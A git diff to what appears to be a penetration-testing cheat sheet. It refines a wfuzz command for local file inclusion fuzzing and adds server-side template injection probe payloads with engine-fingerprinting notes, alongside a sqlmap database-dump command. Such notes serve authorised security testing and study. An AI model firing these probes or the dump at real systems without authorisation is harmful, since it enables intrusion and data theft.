@@ -72,7 +72,7 @@ sqlmap -r request.txt --batch --dump
 
 ### Fuzzing LFI default file paths
 ```shell
-wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 0 "$IP/index.php?id=FUZZ"
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 0 --hc 500 "$IP/index.php?id=FUZZ"
 ```
 
 ### Fuzzing LFI app specific files
@@ -120,14 +120,18 @@ Note that extracting file with multiple lines may not work due to encoding issue
 {{7*7}}
 ${7*7}
 #{"7"*7}
-{{7*"7"}}
+{{7*'7'}}
+${dir()}
+<%= 7 * 7 %>
 ```
 with
 ```
 {{7*7}} # if 49 => twig
-${7*7} # if 49 => freemarker
+${7*7} # if 49 => freemarker or jinja or mako
 #{"7"*7} # if <49> => pug
-{{7*"7"}} # if 77777777 => jinja
+{{7*'7'}} # if 77777777 => jinja or mako
+${dir()} # if ['__M_caller', '__M_locals', '__M_writer', 'context', 'dir', 'pageargs'] => mako
+<%= 7 * 7 %> # if 49 => EJS
 ```
 s
 ## Command Injection 
